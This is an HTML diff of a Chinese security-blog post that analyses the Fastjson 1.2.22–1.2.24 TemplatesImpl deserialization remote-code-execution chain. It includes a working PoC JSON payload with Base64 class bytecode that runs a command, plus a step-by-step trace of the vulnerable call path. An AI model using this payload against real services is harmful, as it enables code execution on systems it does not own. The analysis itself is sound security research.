@@ -1,0 +1,1791 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="BlBana">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="BlBana">
+    
+    <meta name="keywords" content="hexo,BlBana,香蕉">
+    
+    <meta name="description" content="Web安全 | 代码审计 | PHP | Python ...">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Fastjson TemplatesImpl 利用链 · BlBana&#39;s BlackHouse</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+        <!-- algolia -->
+        <script>
+            
+            var hits = JSON.parse('{"per_page":10}')
+            var labels = JSON.parse('{"input_placeholder":"Search for Posts","hits_empty":"大兄弟?别瞎搜啊，你看你搜的是个啥--> ${query}","hits_stats":"${hits} results found in ${time} ms, 这速度老板你看得劲不:)"}')
+
+            var algolia = {
+                applicationID: 'E622EWD38Z',
+                apiKey: '533878226d50d14c545c8e95a3379de2',
+                indexName: 'Blog comment',
+                hits: hits,
+                labels: labels
+            }
+        </script>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <!-- <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-162189802-1', 'auto');
+        ga('send', 'pageview');
+    </script> -->
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-162189802-1"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-162189802-1');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >BlBana&#39;s BlackHouse.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Fastjson TemplatesImpl 利用链</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>BlBana's BlackHouse.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Fastjson TemplatesImpl 利用链
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Fastjson反序列化">Fastjson反序列化</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞分析">漏洞分析</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "JavaSec">JavaSec</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.1k</span>阅读时长: <span class="post-count reading-time">13 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/04/01</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>入坑系列第三篇，Fastjson TemplatesImpl利用链分析，当Feature.SupportNonPublicField设置时，反序列化调用getOutputProperties方法实例化恶意类导致命令执行。主要是Fastjson 1.2.22 —— 1.2.24版本的利用方式，除此之外，在这个版本里还有一条JNDI的利用链，等着下一篇分析。真的是越分析越嗨皮，一直分析一直爽。</p>
+</blockquote>
+<a id="more"></a>
+<hr>
+<h1 id="Fastjson-TemplatesImpl-利用链"><a href="#Fastjson-TemplatesImpl-利用链" class="headerlink" title="Fastjson TemplatesImpl 利用链"></a>Fastjson TemplatesImpl 利用链</h1><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>Fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞，之后的版本引入了autoType的黑白名单机制。在Fastjson 1.2.22 — 1.2.24 版本的反序列化漏洞利用，主要有以下两种已知利用链</p>
+<ul>
+<li>TemplateImpl</li>
+<li>JNDI</li>
+</ul>
+<p>这次主要分析TemplateImpl利用链，下篇开坑JNDI</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h2><p><code>Feature.SupportNonPublicField</code> 需要开启，因为<code>_bytecodes</code> 和 <code>_outputProperties</code> 两个关键属性是私有的</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/BlBana/Learn-Java-Deserialization-Vulnerability/tree/master/src/main/java/cc/blbana/Fastjson" target="_blank" rel="noopener">具体PoC构造我会上传的Repo里</a>，这里执行代码后成功执行命令，弹出计算器</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/0.png" alt="Fastjson%20TemplatesImpl/Untitled.png"></p>
+<h2 id="PoC分析"><a href="#PoC分析" class="headerlink" title="PoC分析"></a>PoC分析</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQANAoACAAlCgAmACcIACgKACYAKQgAKgcAKwoABgAlBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB5MY2MvYmxiYW5hL0Zhc3Rqc29uL0ZKUGF5bG9hZDsBAApFeGNlcHRpb25zBwAtAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAB3BheWxvYWQBAApTb3VyY2VGaWxlAQAORkpQYXlsb2FkLmphdmEMAAkACgcALwwAMAAxAQA9L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcgwAMgAzAQAEY2FsYwEAHGNjL2JsYmFuYS9GYXN0anNvbi9GSlBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAgAAAAAAAQAAQAJAAoAAgALAAAATQACAAEAAAAXKrcAAbgAAhIDtgAEV7gAAhIFtgAEV7EAAAACAAwAAAASAAQAAAAMAAQADQANAA4AFgAPAA0AAAAMAAEAAAAXAA4ADwAAABAAAAAEAAEAEQABABIAEwACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAOAA8AAAAAAAEAFAAVAAEAAAABABYAFwACABAAAAAEAAEAGAABABIAGQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAFAAVAAEAAAABABoAGwACAAAAAQAcAB0AAwAQAAAABAABABgACQAeAB8AAgALAAAAQQACAAIAAAAJuwAGWbcAB0yxAAAAAgAMAAAACgACAAAAHAAIAB0ADQAAABYAAgAAAAkAIAAhAAAACAABACIADwABABAAAAAEAAEAEQABACMAAAACACQ="],'_name':'a.b','_tfactory':&#123;&#125;,"_outputProperties":&#123;&#125;,"_name":"a","allowedProtocols":"all"&#125;</span><br></pre></td></tr></table></figure>
+<p>后面会详细分析整个利用链的调用过程，先来分析下PoC里的关键key：</p>
+<ul>
+<li>@type ：用于存放反序列化时的目标类型，这里指定的是TemplatesImpl，Fastjson最终会按照这个类反序列化得到实例，因为调用了getOutputProperties方法，实例化了传入的bytecodes类，导致命令执行。需要注意的是，Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入<code>Feature.SupportNonPublicField</code> 在parseObject中才能触发；</li>
+<li>_bytecodes：继承<code>AbstractTranslet</code> 类的恶意类字节码，并且使用<code>Base64</code>编码</li>
+<li>_name：调用<code>getTransletInstance</code> 时会判断其是否为null，为null直接return，不会进入到恶意类的实例化过程；</li>
+<li>_tfactory：<code>defineTransletClasses</code> 中会调用其<code>getExternalExtensionsMap</code> 方法，为null会出现异常；</li>
+<li>outputProperties：漏洞利用时的关键参数，由于Fastjson反序列化过程中会调用其<code>getOutputProperties</code> 方法，导致<code>bytecodes</code>字节码成功实例化，造成命令执行。</li>
+</ul>
+<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="TemplatesImpl-getOutputProperties"><a href="#TemplatesImpl-getOutputProperties" class="headerlink" title="TemplatesImpl.getOutputProperties()"></a>TemplatesImpl.getOutputProperties()</h3><p>这次分析从后向前看，先来分析下TemplateImpl实例化后是如何执行命令的，先放上调用链：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl() -&gt; getOutputProperties() -&gt; newTransformer() -&gt; getTransletInstance() -&gt; defineTransletClasses() -&gt; newInstance()</span><br></pre></td></tr></table></figure>
+<p>在TemplatesImpl类实例化后，会依次将其属性实例化并set到TemplatesImpl实例中，到了_outputProperties属性时会调用其<code>getOutputProperties()</code>方法，其中调用了<code>newTransformer()</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>newTransformer()</code>中会调用<code>getTransletInstance()</code> 方法，继续跟进一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>其中有两个关键的方法，<code>defineTransletClasses()</code> 和 <code>newInstance()</code> ，后者就不用多说了，实例化<code>_class[_transletIndex]</code> 中的Class，主要看一下前者是怎么把恶意类带到数组中去的</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/1.png" alt="Fastjson%20TemplatesImpl/Untitled%201.png"></p>
+<p>跟进<code>defineTransletClasses()</code>方法，其中调用了<code>defindClass</code>方法处理恶意类<code>FJPayload</code>的字节码，根据Java官方文档可以知道，<code>defindClass</code> 可以从byte[]还原出一个Class对象，成功帮我们把字节码还原为了<code>FJPayload Class</code> 并放入到了_class[]数组中</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/2.png" alt="Fastjson%20TemplatesImpl/Untitled%202.png"></p>
+<p>回到<code>getTransletInstance()</code>方法后，成功调用<code>newInstance()</code> 反射实例化恶意类，成功执行命令</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/3.png" alt="Fastjson%20TemplatesImpl/Untitled%203.png"></p>
+<p>以上是整个TemplatesImpl链的核心过程，下面继续分析下，Fastjson中是如何把这个类实例化出来的，并调用到<code>getOutputProperties()</code>方法的。</p>
+<h3 id="TemplatesImpl反序列化"><a href="#TemplatesImpl反序列化" class="headerlink" title="TemplatesImpl反序列化"></a>TemplatesImpl反序列化</h3><p><a href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">上篇文章已经分析过Object反序列化流程了</a>，这里主要分析下这条链里核心的地方。首先获取第一个key值为@type</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/4.png" alt="Fastjson%20TemplatesImpl/Untitled%204.png"></p>
+<p>根据key为默认的<code>JSON.DEFAULT_TYPE_KEY</code> 并且<code>Feature.DisableSpecialKeyDetect</code>选项未开启，根据key从json字符串中解析出类名，并获取其Class对象到clazz中</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/5.png" alt="Fastjson%20TemplatesImpl/Untitled%205.png"></p>
+<p>获取反序列化器<code>JavaBeanDeserializer</code>，开始进行反序列化</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/6.png" alt="Fastjson%20TemplatesImpl/Untitled%206.png"></p>
+<p>在<code>JavaBeanDeserializer</code>中会先根据偏移找到下一个要解析的key值<code>_bytecodes</code> ，然后将之前获取到的<code>TemplatesImpl Class</code>对象进行实例化，获取对象object</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/7.png" alt="Fastjson%20TemplatesImpl/Untitled%207.png"></p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/8.png" alt="Fastjson%20TemplatesImpl/Untitled%208.png"></p>
+<p>获取到<code>TemplatesImpl</code>对象和第一个字段名<code>_bytecodes</code> 进入到<code>this.parseField</code>开始解析属性，选取字节数组的反序列化器解析字段，将获取到的<code>value</code>通过<code>field.set</code>加入到object</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/9.png" alt="Fastjson%20TemplatesImpl/Untitled%209.png"></p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/10.png" alt="Fastjson%20TemplatesImpl/Untitled%2010.png"></p>
+<p>中间的属性是同样的方式进行反序列化，直接跳到<code>_outputProperties</code>属性，进入到<code>JavaBeanDeserializer.parseField</code>方法</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/11.png" alt="Fastjson%20TemplatesImpl/Untitled%2011.png"></p>
+<p>根据其类型在<code>this.sortedFieldDeserializers</code> 中找到了符合条件的反序列化器</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/12.png" alt="Fastjson%20TemplatesImpl/Untitled%2012.png"></p>
+<p>调用<code>fieldDeserializer</code> 解析该字段，可以看到在<code>fieldInfo</code>中已经包含了关键的<strong>getOutputProperties Method对象</strong></p>
+<blockquote>
+<p>这里可能会有疑问，为什么_outputProperties key会关联到，outputProerties的getter，这里主要是因为smartMatch中有一些特殊处理，具体分析下面会单独讲到</p>
+</blockquote>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/13.png" alt="Fastjson%20TemplatesImpl/Untitled%2013.png"></p>
+<p>继续跟进由于该字段类型为1所示，使用2的Map类型反序列化器，对其反序列化获取value</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/14.png" alt="Fastjson%20TemplatesImpl/Untitled%2014.png"></p>
+<p>获取到value后，进入到<code>this.setValue</code>中进行set值操作，先从刚刚提到的<code>fieldInfo</code>中获取到了<strong>getOutputProperties Method对象，</strong>然后反射调用方法，进入<strong>TemplatesImpl.getOutputProperties()方法</strong>，之后流程就跟上个部分分析的一致了</p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/15.png" alt="Fastjson%20TemplatesImpl/Untitled%2015.png"></p>
+<p><img src="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonTemplatesImpl/16.png" alt="Fastjson%20TemplatesImpl/Untitled%2016.png"></p>
+<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>这里贴上整个过程中的调用链，画出了核心的几个方法，有兴趣的自己可以跟一下</p>
